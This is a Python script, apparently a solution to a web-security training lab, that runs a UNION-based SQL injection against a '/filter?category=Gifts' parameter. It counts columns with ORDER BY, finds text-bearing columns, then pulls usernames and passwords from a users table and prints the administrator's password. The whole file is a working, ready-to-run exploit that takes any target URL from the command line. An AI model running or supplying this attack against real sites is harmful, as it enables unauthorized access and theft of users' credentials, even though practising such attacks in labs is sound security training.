import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

def exploit_sqli_string_fields(url, num_col):
    path = "/filter?category=Gifts"
    for i in range(1, num_col+1):
        string = "'lTsB95'"
        payload_list = ['null'] * num_col
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False)
        res = r.text
        if string.strip('\'') in res:
            print("[+] The column that contains text is -->  " + str(i) + ".")
        else:
            print("[-] We were not able to find for column --> " + str(i) )
    

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sql_payload = "' UNION select username, password from users--"
    r = requests.get(url + path + sql_payload, verify=False)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password.")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
        print("[+] The administrator password is '%s'" % admin_password)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()    
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        print("[+] Figuring out which column contains text...")
        
        exploit_sqli_string_fields(url, num_col)
        
        print("[+] Dumping the list of usernames and passwords...")
        if not exploit_sqli_users_table(url):
            print("[-] Did not find an administrator password.")
            
    else:
        print("[-] The SQLi attack was not successful.")
